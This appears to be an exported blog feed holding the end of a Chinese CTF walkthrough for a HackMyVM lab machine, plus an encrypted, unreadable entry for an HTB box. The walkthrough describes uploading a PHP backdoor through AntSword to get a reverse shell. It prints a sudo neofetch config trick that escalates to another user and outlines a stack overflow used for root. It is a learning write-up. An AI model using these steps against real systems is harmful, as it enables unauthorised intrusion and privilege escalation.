<p>蚁剑连接</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2021.27.44.png" ></p>
<p>接下来我在目录上传一个后门php，kali开启监听，在蚁剑虚拟终端中用php，即可拿到www-data的shell</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2021.31.02.png" ></p>
<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>sudo -l查到有neofetch可以利用，<a class="link"   href="https://gtfobins.github.io/%E5%9C%A8%E8%BF%99%E4%B8%AA%E7%BD%91%E7%AB%99%E6%9F%A5%E8%AF%A2%E5%88%B0%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F" >https://gtfobins.github.io/在这个网站查询到提权方式<i class="fas fa-external-link-alt"></i></a></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2021.39.02.png" ></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2021.38.30.png" ></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www-data@first:/tmp$ echo &#x27;exec /bin/sh&#x27; &gt; a.sh</span><br><span class="line">echo &#x27;exec /bin/sh&#x27; &gt; a.sh</span><br><span class="line">www-data@first:/tmp$ ls</span><br><span class="line">ls</span><br><span class="line">a.sh</span><br><span class="line">www-data@first:/tmp$ sudo -u first neofetch --config a.sh</span><br><span class="line">sudo -u first neofetch --config a.sh</span><br><span class="line">$ id</span><br><span class="line">id</span><br><span class="line">uid=1000(first) gid=1000(first) groups=1000(first),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)</span><br></pre></td></tr></table></figure>

<p>成功拿到first到shell</p>
<p>再次sudo -l，发现有个secret，file查看发现是个二进制文件</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2021.43.22.png" ></p>
<p>下载到本地用ida分析一下</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2021.45.15.png" ></p>
<p>学习别的wp指导这里有个栈溢出（这块地方有待学习），输入超过10个字符串就会执行我们的command，<strong>思路就是sudo调用，然后给一个&#x2F;bin&#x2F;bash</strong>就拿到root到权限了</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2021.47.23.png" ></p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>图片隐写分析，提权命令利用，栈溢出的利用。</p>
]]></content>
      <tags>
        <tag>hackmyvm</tag>
        <tag>blog</tag>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title>htb-Heal笔记</title>
    <url>/2024/12/20/htb-Heal%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="295bfc1a15dcab86d65e99f7e6ae9d23e579558b6480a9a0ea72d457c162f9e1">948d3a4d19e8bce16b53ccf2f5ad6f1a0f2e318246b5c9ffb29f08d8de963c319a99b114f15655a820fd489c6d601bc2f92ac36241141f3fe38a01f0e8a91630b344fb1de001a7e67c838011f0c402fd9a1982283683860961298529bcd2bc3fc5b2df9ff1cc909bf291471049d56a31432a5a7dd3fc98681b168be1310a67e8764add7536de1443c617c4368c245f353821149c9f5c3d96e98526bd8152d92856bb2f35e47db3ef7eef0e44554d4a249b34a91e68b4ba7413d70c19ad6444cb7d4068c535164abda8050d0ed98496643b6aee925161536417ec9bbb645175242ab0c2e1a60d0299c5ba355b9468424c9e0a430575bf1caa8d0e18b2a0bcde3408fb497a81b17a5237e34d802a79ae454ab699fd6b8ec9482bc70eadd25628c910a2677a9c3faa06d668aea8fc94dc167a2875f79ac8ba70998780c30e39e7b68bf1bbaf5d90e3cbc8a0bb55829b7c2a576e21abc7647131705504f91cbbc02a64930eda299f27cbceeccdd75121d6c5074343b04fb3aaef08381fbfe87207dac473382dbd5ab0ff9f10982ce5ea428d00c00994e17ab44d68b94a9ca0846ca85b8abb2dc1b2179abb465d07c01c07d5a5442fff882ee457fd72cccde2e5b150bedd35d7df0cb00ca6136a0645d5f84322b967c4ded3936658bab2d3b9180f6efe5cb3a63351c1dd37c668044e112a01aa4c8d9f8e0243247a6efb6c06e60da9aae1a47a6f6303f2ebb7d5b50543bdb296f69ddbfdb5835d3235afe794a941bc65d4611ed3a80c980acef9c3d79f207ff453edcc77507dc13ef130482a829ac65e39efd4d2a89985a9e09b789eb0842905d6ad4d8120ef8e615fdeaa94cc239a5349a42c65a2ace95ceffd514d0c995cb77afb86a4d2ff765012ec849b49cf8592e1b7c2400b164de46642bf212c2e0af92c4ac71cd9915aa3117707384b36e343902a183ac316f22caaa501631da98cac7df55a7cf4b47ea4c668aa0301f3d3326dc468108b9b1989a5e0d9ab89314f8dbe4054025871b6f2811bedce8c20cca9f31d80dabcff20967d0ae14902212615cadf961a9ac8be22cd29e4a5997c3286d683d5474a9871a6f13923524cc3a5e98c7af834ae7a2ae88ffa3c9a3d6d2948275b5c12a9725c0792caafb5491cd2c344320ec0659df418c0e89271ec0a554288c89dc7e6b9014d8558c49277e7abebb609ba2ec8169b01060e60436a0550d2b5f2fe6764c5abf3602f960d9d4022c15d72027f22ac3401e6afc3065add0abea826813af51640a466538ffd9e8c6cb4f9e0b38a315c1bc4be7791889eba717f147184d84af120c83be6e75d893990ac73853121bf2a43dd7b565ffb9c540a4f6cb7c446e252114d6133f2d7eacd95caee127cac88361639e8b214b487b2eabfee390f22d0e74e04105be79179f0f189e0ab248720f29f0b5dd62b1a1ba4418d48637acd1d66cc34eac1f13c09652224e68cb4c3e69d47407c3dbad5f277d619a2e8c79afd33c43a7fef7235bae70fb7b425cb43633f75386cd1f98d98ae995982d4c36c7270a239a43b2b47381dbc80ab168426dd89e3eb9723b3c8c37d56f815c5d3475c0d89c3e199217e2ef60a5cbb1b193b9e8e61a01444c0a7f6fc2b88247606ed5ce8cf153ad70865ed0b7128a1052d9fcb4e19344f1ddacc59a751959ff51603533dc3d94ef6bf6e1751b2058be7e02b05277a9f230351e8ee121af3166bd8e7a95230e55ec3e64921f790de7f68b88b38cc38828a1ed4dc61bce1f5bdb6e7837cf136ddf4e35f8aac655d9e2a346b10ab433e8f39ce283d688ff3087337bccdd734c514c97d436c6edce3be8ffc040da4000b698a6ebb56c499f77fde39842f7d922bf6939ecfb993d678891e9813516cd2fbeaeadc5350048b07a2e78e5fc289b24b4ac772e7e24debabfdd3652b4ee91a880a582baf97d0ce6af05e54a0941e4469a841d0308f7042e8c7645a73559c72dd28847f37fba047202da345f3331aadeca4f089f5c24533f6635c552e588f88d06d11460a4aca250fed129a24d8d66ccc8c5bf12d814453ae1f239afe165b1b8bbfdc6fef1b1e9a6a1f1212d2be22933a369cd0aa08cb51b46f1fdb47fd3a38dc66659f86cdb3a63a2cc9531bfcf45ce3ba2452323bb78d4a337a60db5e57439145c2b425afa1634d1f7d63e06750e9bad26732d295552b62ac9497a4ea7a9c0efced69a3c2620c239146df6b8dfba25c260be9ab7bf5d02cf18058efba3ddd78c153de744afb7a77a47984391c91728cedacf9e5782bd627fcb378af7abd6f3f73239b5cb9ef7f0ae21e95803868ed612cf31465c2a35e8f72419555f3f9a1e826c5d4ade4b747cf112e3858294de2b693fa81e7972132eb299ee912d10518057103c3a2fcf780a3c0b5ae23aa6f950e6ac62dc1468bc9a092e7766e2f542726e65bb17955ad25f60715ab8e7e0e3a9bcdb9e0314d779cbb4138f8b090d66b681b60c367e95c139661a483b2513dc441be674d7b8698eaedd73e219ad9cad9490c0d31a9383ad6f18ce1ffd56f53d052bb74a418cae529a15ca9295cc735775d9e2e999111a1077cf4bcc473bbade20c662c7ec35ba3231b26e2efb75b4511ef94622a07ab37401a13ea68967db8215cf3f1c940d78f35cb27b15f7214ffb8073ff2bf975648b36e90c01bf49e15d1cdddfad5dacbd5c1e12b5679d29ed18f96436ba7c179247f2e20566de00ef7335e935b17b39d6651ac0d9ceea1c1062cdcc563cdc391af59ab8c58d2c0185f56cbc3ab500df2c9fc7e12e2ddc0847e2a87d723b6c3b6cc723ceb95b7e9e354ae8ac913d48d54c224519887d0f2ae256774e1f5c83774b0b1a7a0922d7b7008ae801836f01fe6ef04258b537dde1e3d5bf448e8ffa3455c7bdcbbba3749d64ae1db34a265e8c376e5602d46553db34b4ad738bd50c887c93f09cce0b0d3b5387dcf02330152e9c43c9dcc280c6d4785369afcea42cfe8c21776ee327fa4f221d33d3dff5b063755c80164ca02a47ab1631641ffeddf7efd0eff85a97d96591d8c58d64e9c398d90262642767bff890cede9b76612a1864ee3ea8fc87cbd225dbe866b33fc8b31ee43b854c108dfee06e05e5e26d0be64f07137820343bb4d47d431c3f12ee15b14fb9a9423edbea999d9eb67efa83d57e04e88268041a014a955dc702e53eeb9ac56c4267d83c159613f18a49f491c752534313877bd3e86811401b5dbe063746291513365261d0702a1321ce999223e42d0881d1a202a8aa8dd5667408d3f74e218ebed3e59b8132531631ac6eae8b9659d50b52364aceef0e6481e3dbc242c5c9afd6e2bf1d25e8fcbe4a2953e0c88b4c99e9999bdb16e11349176eb1e5d9a7918540853dde699af4d73230acefb5270e142bcd967a5c76e5176e88543ce6b6defddcbb404cb8e656d85d996b851643987d1e3f82b536d82aa57e63406db32bfd638a17db2ef0d0aaf5180fd85b6ceb777dce2fdf0cde188ae6dfb0453683fd2077aa47ccef985666cee94e40f0737ee47c8c21596714cb2b0ad6eb85e9283ed97c5ebd06fb58df17ed92034c72772cb7bae91713f9f297b0b9f57d66af863e690d111cdcac9502b0ad65d38792bb941c583dc8818b520c93601f3972729d6168cea4217a8a1954b47d3b548f9656271e9c1ff7b347cb9f04d30b7aaffc44d32f308e0a7572ca2c42c9995dafb00dde183c5dc87b80aa57936414dc006dd62653fd6c08658a0a4af375d006eccfcfd8744479c34afde6780e6d1beb93cd24bb5629d1946e25e3238d1d45d7a196adc367a2ddf3563737869175c67eff101ec7a7bd3c901a9d4f2f09b5261ffe36a17b5564c451aea200394b4aacf048a593f2b9c04d49ff8dfa16986128d9d87d3180f0e7bb1ce315218c1220bcc15ba186e5558f53a9884b3f158467d831edef857d1a6ae85236f4800fae3ae535fa6ac783d16f9ee72780ba9cb25ff51436b2a78dd17245ddd5b1076f1f49bca87ee1ddf100c8d3ee77e07b12fb4ae872d94d5853a16bd46bed15aa77616f428a671a04b73ea2e6739ce275a63878c71a686ea090771005a9c55c68a6c6759da061a5a6e817b6e13d6f65048873a3784054f64c4d9fb9bb7483c12d9f3bffeb247862f6caf889a76444f6adb3d4d447ed28faf162d8a3b66ee1a69068a9dee602d25c18902d830fa04e14381989c52a2fd9437fa26eb6165cae387e8e45a8d4a5f99e7a7622220dbbfd754bfec4c9b6ee27625277ef01bcf7409deb99a02914000f0a8c1cbddd75e90647bdf0949cd6cc391d6ed290069cd28d3fe468208127236840ad01f1dd9e85dc06d8d64f50ac2ce3b5e9e64fbc10bff1be37dc18853fbe727873af30e6f7e6ceec377b44a8c9026a086113cb7bbdcbe74ed90e02f2fb51e877c5b61b166bd9af7648523c21e63019d9cac81edee1b684bd7badc4fc3604f7b870becbb88d499eb04a4d9aac0444a3cb1425474b2355821b828d684889e7f450b875d5436dacf6ed196c97508f5382e6245b3920686d706aacbe740fee046b80c0206cb48c0a41e52138cb728666ddf73b5d30762ad623203caed183c641e93fb9bf08caeba7615c98450372650a88536ca658c9a7f14bbff685a2363e21ed11eafb6bf3797f111f8eab100d3173c50d19db59d65e859a8dd21fbe296c688f3b5a13aa27534fcdb9ab673cbb2c88b62860461d80dce5fc31a4ef8ab130dbe042b4ddda34c7e1471809de85de50041508f113c659f6f7f8c9a77f4a7d47d7f85fef644aa576127535b89a5e7c610778654da7ebbbbd14871db6f354207dde509a238c556973ebb79cb27dab27c30642a93b9e949517f95eccda22ff8889fab5fda930a7eefc331994f0009f7557c979ba2c87ca14f43bf1e846b5319e7c0c0ee47053244fdcadbfc572fb963e65f9a13822adcd98ac4aac540f42eeb13de4ba683ddf324adbc8d80401e5e0d76694bbffe49356e6712fa3b225e3bd3538c10fb5536b450567276b08c0a8640f7a6c0a3aa4e9a58222d9e96cad02426ae1fc54c16747e5da2130f743528b07141b9eace3717cb694ad09aaca457b8a11e363471bf72199b77ec0775e83ba4a5b08b8c7b696e767f948f64a56e815d1fc918fcd8b9e09d65988e62a0f173b84b4b6d7e38b3e4e01e926d51360e54768361c123bcea2a71665e597203b7f5dfe801701392b640df21f59bad13a3ec531db80d88f5bc32bc1a79aaf22aede1645f15741dc53d11608523ac6c02099534499426a27bf2ec7769fc5859acbe0f51ae6124a1fa1cf2537a441bd1f66104d319f009dba5dd7e078893c323925b68a3694813ae9cbc6f34e9821c29d6d4fe4ee065409fd8fb830f96ae4a9daedd30ff3bbc825e472bd33bb86d9f7d8838fe5b0f90eb5974969f33432399d6ff46a7849dbe7b4e31a046bd1f07231a444d79e6f00e739b6c9987e7865325602263b284b5d9bd9cd7d8a95b561d8a149a628ea0afd65dafb0e3cca32d33f63fce039f140757bc694c9d7a922caf171cf910b30c16c40a097b73e9f3c4fb1d258e123dc187585438dbbb54c68178606bdd87103d636ec60ae4fdf0ad4c50e49577b001313890b369bf8205ab0ea5dfbba53b7b984b90dcba2b498a3e287ff4329b520379473a60c3f3848c487b0369aa99239b9f19dfd94baa41cdaaf3cd4d4f33a104cb4672089f32143f7ebed330c10b5ca1925be96ff29fe0f6c8c8760537ed606b1191a3feef26326dc4e0c5a6c6185a9021e67f2620d95afd647db6d71579522a5f87358f72d3506c9d63f8a30ac2c3b25081ea41405ba6aa72e740cf059cc678e2d3c2d8ecf894bbe6f2a2810d3b85d6800327efa34bbcb86bb09eb6ab9be6e2606ba5623d239c1fbe2ea3b39e034fd6ebfaf17683d664ec2aced3f8e3ca203e49595a1a322ce672e50801f8767c738042d6f0ae1a1a9ded55a558a8e571fe6aa5e228688f7dcbfc5347f1d89797cb7ff1e7ecb99a62630ed5346ca0927efca80c9644851ea2b2a6228baef98f5cb686f4aa4ec24eeadd4918ec424112278aff0ecd57c3f8527e059abb6bf8760d16f47f0f95cb7e1d4c169dd0767591d75173c61372414c2a091d940b7936503af3d8d7fdab63d84eb9e62c503469c7fafb9d5fee0283607726f376e7b46fb5d7aa61921763b19ff2d70b32ab71dc5d0bbf8c7e47f56a43934edfd386cc58165f6c4047d9689b559cfb335046e3d31b2d8aa7e0de3c84e23505a01079ed348fea0d3bf0d2a8e9fcd092bdfa080229acdd31f4f43ddc0f5667fcd4e0c1ef893f329fbb63b7cdaaa7402a3f8b7a01b7b803f3474c2c4ff5ed2745cd2890d24647df4d524b05ebbae68e304991f354c0d0ed1fef9a1cb09fae7457404106082efbf9a4a61d4064a2885e9891dba9dc64c01cf83f50960333e4e8fc2b96eb340bcf469017d40844316a1472fd33449f27030b1ebdc32ca9632079a9cbd4a5b64b47272e364cd5934e2820da2985d6d1e243aea2ec057fc3f1a7a0a2efefa727b3d21e5430001bdf5255b4a40aaf94440ac32ba83e5b0e8202804d64a078e016415f82fbfabbecc4ab98922e0acfea7dca63e97ae8dfd76f13358e30fd03a1afa2b75664f674984abc93a0bdd800edcfc08785d7432f13c1cf9eaf0709b2c050bc625f9621cc0ab65b5f021b733d1e631d46a5d5310884b1221dde804a01e8dfb73ea763e33877b0ee92b35aedc498512e8a8834dd78346e4bfcc1a6d1b1969179db516978d548f417d41a2356f0b183d91838b59770916db56c6affc2315f4743d461a06a01fae5d56a3bbc32a2ca9b915cfe107bbc4040dff08c78a8770f9b73a26f9524ef87d2a32ae41de23e18857b4a93d13b6de676d3034d9fbc306053241050b6c545fca49be1acba072e126d059f72fe729137e8098f28048b456ac7f9781757c856ed0439f5279d33010fdbc2bd36791816c3f546eeb5a031936a9f3c3463c9d0d125a831b5948d5b7088ac33cf7d8fcbd2c48b534f2129ae4d1b86566667e21facb0292e76bb9b3912f4caa96b7ef1fdd509c64cd72ba694ff2232be3a01a4e97d1cc267e52bb2e2e38ab76a78e7acbd1cc0332308e874fa5498eb3d8cd09a6a92fafd9811a6fd00495fc1b9d28df86ba8819da1ea6e7b88cb11f612d84e306f5bcf4c9b369e773eed02bc75c7a840921bee31e061599b9136e63c07fd49b2befac08f617820e9aab02473e8b82049cc0eff778a8e652ef57161a62f03a9baf4059dea89a5bd9de6231e149c7c0e198aa2eeb6ed604f54bc7aab41825ac6df80418240b55e9d513a664ced381d4a70fcd7ced730882836345676e09bb56a7cd64c1e83a7778dbd7881013d7ff7bb1dda990bc14fa952c3356ce5ca64dd9634dd330fd40c8441231464cdb980fe5fe76c910ca52bcbc5c1f77575efa40875415170cc80e7976708cf3e394dd8d562f9993b832e5e9ee13e4382e666484b4a123af6f06c3a5196d0c82ca9e647d823734fef30353a58f4867fc7ff5d95c245699a0ae1f82c61030b93057adeb3ea166d2dee16fe4f909e2c9f70fe55fe2fe6980f3827c72d706f3709af5ab19643d06bcf74d10586d2eb4f8d28adaf6e2e1d9a41e75e1bc79e41a1b139d1e647a8f57c304298c3fbd354fc52d064f9568af56862fc5c9af11104cfa67169c8456425d71a705ef2154c3d2d7e3f33e217aeef624b11c9bedcc38b05fea7940fa27bdbc2385f2487bc3a0d6533f9e5937dcce54d9f1ce550557d482927aa1167e47aa3244815a6c6d61973ce51f4348b85a0a8efbe7d419cde9adfb0af74dd65dad60b5db64c642eaab435898e58804720bddc1031638302f9151b81a7e8e3dc7abdfa381bbf6aaa46772a60072a434541b4bce73a09cef17f84b016206f1c4c619a1910dd8269cac828ba64a9bc5c0dc9db43b59bc7b6dbcb8368f74b20c2a92d25799612e7feb018a1d991a91ac30c71c96969dbbc203919c9f44c0bd9db20ec8efedc9af04b82d2ec4be2c6ca8c1b2c7b78085cc18e8017f7ade6d77a5cd419b779c23cb2a95a142b3aa1324737a2590bddf1381f46406ba6dc7c5a553d24c06bdd004ea9f62ec7360f5866b7d31287aa1dfd18dac4a11a39feba646a43312fc6f8d1f00a3adba725c7e3b779d80911db6cfcf1a869560b8323ba26125defa4cb3e1abc6d5266d6cd4ad14b9861ecf3de2c1aa4c490feacd72fe799f77d44a8671823b3e14d42691b98ab5abeb4947d360460bba6f1fa7a24d1d77ae4750d8b649fe3dbee2123ee46821288886eb29b03092c4d9e6213d21d2f4cde1ef10ef30252552c7fdb1492c174bb3c3cc8e8e05b10be84a3bbd33973874f50d3ec165f6d9bb8168bec28afb13dac3b46a3c10e093137ed64ebdd966bc96866a807759c131347151865159cd41634cc30f1c669c14a55c90b275f8c03a0da01e5fa16da186fb93a689f3131f0564a61db6b97b6b7803c6c20de791f5d609a0cae9451e456cbd3e95258878ea36bbd97fd5e01ffe3700f5c5488ad099da8d606cc5e9ebebf9798dbe5420f3cb73693469d136bbb7d7f457ba5b070a0264451309637e25e4a32695d72d408c24b934fc4d53ab6ae711a3c8dff3e2e8da74807da589e1cc5d445086bf2165db186b92d170f4a9ed66cacc98bfd5066176c27ee61101dd170d6bafe70aad3818daa1874aa6e0f45c4547d0fe223741feb4303ae9823cb48236cea1d23ea2b2c91cd3d9bfa95bb52e3db61798f90d63f8839d7e5222e63433a6209bd41515899e42a0103aee2f89411a7c40cc1392d125dedec4b81ef07e10cf1bb739102dec2e8cbe1ae0b11863d2fb3427132179bd67279fc50282648b98acedcee1bbeb84b556a2258aed42147fa0ba74b35382bc22ef819512b2f37af75b6284e5091119e3e065d0cc2075b599639814481684e129fe2aab063b2b9718a6dcc3b9ffc6aa2a878b43769ba57bb3d8e13322f6210c32b3a8709296275940f443a6f7be0b397ca583c3f1f277c856b1c0412d1c473123eae454a5335073d23b61c5cd78985b98ce5742df5ca440cf9c7bfc904eca6da9b6680492fa2a2fb041f38a8217acb4851da0effaa96dd8744ff2a4d76242bac5993c3ac5834bc5375b8ebd0d50c4a37134fc1ee3bcf52ac836eb216283b8ab1403ed6ea618457e49866b26493ab522b9ef52bb1b9d0f091515176e97e05d23bd99b784c2beea9fd7832ac9374ed932af7dacea35fc0605be10a4881a051538a127918a448506896e59362aa6ec3f5ef7b0d63b6f71b24ff87bb5a8eb3c422fec6627320a0403b504d5c7df89d96c60002d287f01fcdd5289c8af0ccba5fbec5083cc2d82445df8b9026dd56d3ea92d949a82da9a2d4e1db47fa66cb434acb6767ca3555e43106f3b0b3a3d61cfaad8d49b265a74dc7e6c506649f13bc02bb1f04358a615d19cac3fbc0d823a9364f6d9cdee483ee092a944dae3327213a354e41dbf8157e80dee28dcc74712cb267a8cd2299b2270f0375078419f1b0111b1a256f791f2f1ab0084099c109d0a777f966555fecd0a6c4da980f1838ae1bf5d2334f8073d0a0b4232fd7fb666703d8695ddfd533f36b7cb4e24f2116a1eee7b050e34ca0c8d353217cd84b8d81992714b236d83baaf85f10ef7b2d3d0289dd7555f0fcb2caf250bab37c36188087e289b8d1368480e83fb22441fafd0ebc1dcaa30edb1c7c15fb761575237354c9cc428ca77e5bf811e3d6476084d4b7d854e6fe40d51614814f793a9d9042062eebd58b74044b1b71bc181fb01c38c806658a78a1615b66151ebb7865e5f972b5a909dfb2d06fd71a33828bdae14a6837c5147fde947ddec0e3def2e062db1e0308c670f1f2b2138f0774ddeaabd43381372ffca72bb6aa4d5795c28ff60bca775e60ea21da55a735225371d6d57af60c1d4f531249f6a86fd65b5e555065bfed030adfca32a1fa87701a2e85c69ddcec0750b5b7d7ea4168900b9269645f7e1a49018b5c0d68003b5d2fadc631901c068b781efdf8c988ffca67f26dfb00d1b98994345e70b27eea558144463d844fef0cebb4ab7ca36e13da19d5da828873dc5085a5c5237beecce7b9372c2fe233313dddbf514d927e33b0d7f15be0bd225b6de65d0b06de67d55688f83d484fcb9b020f8377b9ea4f3061784426bf33451f607c4732229173158f9cca33fd2ba9b0f0e648c477cfd19b7c2be44ce9361c3df00c6814b29697e2e6a22c88f538bca9c0742a2d716df01e09c8e68261206c7d12999c5a1ece9a2a5a069bceecdec7264b9bbbb83907a8e806c7e28c2f3defab3b51934aed77284897f7cd14f5cd3c508a10493d1b137359e382876dcfe90b8fada0877af01fc9c3387d90827be73f48f7a6929eb00e8acb867b4ad2c9a8cf9377073e80f425b917994caeff2225f48260848902410314702359d7b3d121f90d5f5b0d6719cde5a1b9abdc94dd68d5c295cb188ea177a7201d91121840464405a960fc8261658c475ca8a679d0f8268ed1371f2d08fcdd0106ab2d3b503aed063e08a288ce17ee8fd3286cc8792fd634b1f5d5955f60c1be9ad752061eeba3acf2eb0fa98fce946a13ae7e97b063a3fa7cf301d5fa9a46a6335e3cf5e421172a2ed92c386a99947b372bb38a03c5646b187ab4a82e94701f1294023d7f068a0e723822aa883c5788037163b7cf0fe8624e9a011d37f01d7a02fa9d0f59f71370619be0d6c73816a8068cde639cc1bd38bb295bb1ba2673ff260a4d51e5f66d60dd4d28131800ff1b989cc833c8a7e80fffb513c2a84c0fecd225753042214c5e4f4f086e9556e5d977179c5ecaf2718c6f1966a516672b28c3db6979b3eef4b01c0fbd7c28b42bafd36297f36c3a2d21726b6747b9125dc8fd0d7be63d66cd8f3eb0e0be69e68ba9f13def7094c1a321a3b2e1243a29e98dfbce5e7fed5fb5ffb138d78b375dc1b47433ede3be25bedf9a4354db158a8a79f375b3b30eb274ba5c2e4001316aabed47598ffb9d5c609efcdf0a78293ee002b1f0bec50b81f04241431f94500e878ded7c1bd3f7e29e9c3e83096ac39418b680bf1ca45685e9ff396db00081779ec9caa1b2553f4cd20c2139a207d14bc53a7ee493492018ae0ea2e3292b55544e58b11486c7a1234ad3cda1d3d7f23147b4268d18a7fbb9db66bd56d01828e8595206e29397171cc70f1baf359c3e9876b39011a1cae4bbd73c538cba6778dc46d8ec23e9ac39a5e01504a6dd3c5eadd9a4dec61730c4d7fd48a37d82d22869b2b13c3232cb2c0da892a58f858d42a90009454f995ed972d3964f9c68956b84b81b4d093b255646507349baa5907150205299981be657f50bf466ba9e61c3e30d1f5e868231feea54ac873ba25fc9e5f474f4fcd040c1f28288b8c84def88859a68232b1bf901dc4b4a54b3edfc907dec4c6a61d139adc06d75f011c3abb6de40db96e28054550e5b7692090ae3b490d7ab97ab3e8d0167f9cb89d050d2b4a10a935815d06c3ad36c53fdd23411e94acf6d7f8b66d2867868a11b95afef8f508d7aa07b354c592a801dafc12974841eaec77f695f1f3200fae1c66c143c9a2362e387c4d7f03c1d37472b1814a31d909455b592bfc147f923f512238edd5a0bb33dfeb17dd944dec5454e7fc29d90eeeeb10b1b586a1019be0ac271f55aaaae8b0d89faf384c93ff79527ab238008114595b4fba2dda547599bff1b8b3d0547ebecc646f5e7d4d8305c813602a94b24c42e63e42eb000bde6c7cdb53ec09c5208ff8fe475a9298738f896a2e84161d8f8b84f7df2b7744a815720a55917ac6dd20c2dd50ef9bb410abc1f44a5f1b722f74d515fabd51acf2b47b34577a517616d45ff44f973a7d999ff1c73f106d732c02ba16578a805bb3d5ff700ddb12b02ce224bd3beff41126f55409f81ed84170bfef86bd5a4e9a78d20c9dd6680ffc1d2f9a24c4274578080cf956d7fd077d212ab1fed498c793d5eade2bfb54dee6740b24d928a3a9d1181700b644c874c8fe4fd52b00261aac2a2f75d6dc15e842fbbd750f1f0a98f5855873999d62a789aadff5533dadf4f7e89caed93a9b18ea3c1b856f1b33dbdb6e6721714b18a7b9e191166536b7671d346e79ff313cfe03ca1ceac8c3208f050ae77de0cd2b00ae7c7079ba61b5897cc419b9c3fcea9ac99b26f823da1db3141417332560c840e34e74c56327183e1ec194499dde1e6bdd504f01c51946b5ff6f84f2da57b84ca589169477e628da23b6e12f8415367ff9e92b14175af8d9381aa747673bb5a3f0b581aabc57b338c9fe127b642103c17ffa79c6b9062a498406dabf61dfc8860b34944432e58f54038eb79af9ad658a20db1fbb04ecb2f9a8fef162cca4a8b6e64e27ea3bc9c17af9c724e3da4cde4e7ada14da4052a2ca351d2176fe72b78691acaee2857652a7fafe157b0dc6c439634cb9df9ab9dd9441dbdc84d1ede6f16e9b8adb100f4b5a788de18930c85c24eae426028f07449541ba92f8b3a84060d7b61a5e96a1c4d2d3d711b97de40575973e562bfa42d234cbdb3132be21b98be265434db9f60e8c5e0bbcd73aba424d4423969e7f698281bfb53ac0e70b6b63065cc841253d57ff1838451741396010d3571332a118d70567548522953a9c90ab99b789bfa3472630096db8fb68fa37ef46f289480c9fad60823f9f94487cc14ae7745d383012d516cb86aa3c2fc24a94211b99b7ed9e710b959caabff1c900b5ade0f277a66b4d20c7061cfef4e0488a911a5a2575370657ae8919f048f086b50c3d9e637912652188129a21ed7bd3e258cda367c2981e35d98a77755367b15aa238ad8db983d19a61ccdf48ec3421545ba150c21f783b456d0681bba2cfdc863e727228d574c9afe6669374d06e64306da8a8ffa00319ca8d387ac2886285a11a2f41c31caa088da7b34a28e08535081dc706950afec2f6dead00ae2c054fef90af61e9b1a8425494d40964fcb586bb2b8150aae60f954feaea69ebc8a3c33a1176197ac58f1dc1f1c0fcb627fce90fac4a24f8fcccc77569115379f350f486df3806d7dd677a1e7529160fdfafc167a00f31d56265fd81b6e4699c676f33eebe63f05eabfb49b9c1fe8d6c805b097200aee21229f72bd7a61c0077e773b5d4effaaceff7542276b6fd79a0cb0fcd4a833aeba01868c417b6d85d54d9f5abeae0634ddc33f52e6366f313e24783438d0094aba40454ace697612521ed0284dbe8a9944b5f5fe68de0995748922dace3174fa81dea79d16feabc68a8caacc8b51eb2af81b2fdec378ccd0eb4560c3fdf96b43b51d4794dfaabf11f78428efe22a701931e8eff16ba02e6f7be937035d5f9dd7d28e21cf431ab423d74be04f07cdace4b6b423781040bb1ead672b895e48ef08ac631918c5c4ceb5ca0a9e233721749d51a51681909b0bc361fed97c424775a7d3c4a436feff1d73457f664335f9983b10d6b9fc38ea6bb9b32448805ddc179bcc80ab3e3b15f91761506f2d0c889533f99c03a60f5d4e3e667f137557113d9088d1a9cc4fe01ccbcf873f4a38045e80de3bfcea30969fb45e069591910bc3e3efbc3337ca3557b995adb32466e64a97e6225fd3342a3858d6f8724cf9c47e6df8bdb0972aba34831e9384ec9cd79b3504f829ae7f62451e627a9be25f0b07a0ddae52d42a482ec316f7381b6b5e738e56e3bb8b35cead3a763cb8a975795ba5a81b8edc467477b90194dbb76076d5ee0e0718fdb6b233fd563ddcdc7112bd487d5759bb57009cef900fb7cf938e7baf7676dfa43f1081ced0b18f69349fee4b2de92eca1b4ed9c57683dabaaf30695940a794de89eb36ef6d4146db3e8bc494b709cd3f7cf675db8766a763f29ff1225048d8cb710f8a16ecd2aeb7ee60f63eefafe3fce9011700ebdcf691a6e6939e03a37283517e90b0d970ef8b38235e15f35384716123acc2e3e4077c07c49f3af6c39a3d7fd754a761baa46ce2d4ae822d0002e8f27d992ab6cb1a23a09deace0ab8f413301ffa8c100a59d206690ee49650d6c04414c9a230a765b571c00994c3d1197aaf103c6f5bb3947a29e2960dcdbd6b0233b85971965c550feea21e4e2fcdeed16cd564defed08a963fc0a807883517b61f7d668a01d04fd22bf7f19a70609c348de9e021b203827bd7c3688d16dac822c2d31f1d636a34688d078da735f8614b60bc8a39b8cbe97f7462be4c9d5d9f1727ce91540cf113e9ab4c6c9d53611b8fea39992a3416f1eafde747a845bb82036a7c729f72dc282b160438700f517ecd55f3f04e0279aa8bae4833b165cbd666c04e9e99bfce33f39682b20869ba788dacb8303b415beed2d81a5592a21a88b7de300ed7c4ff67d02ae50981662bcf037214c7bcf27956778198aa4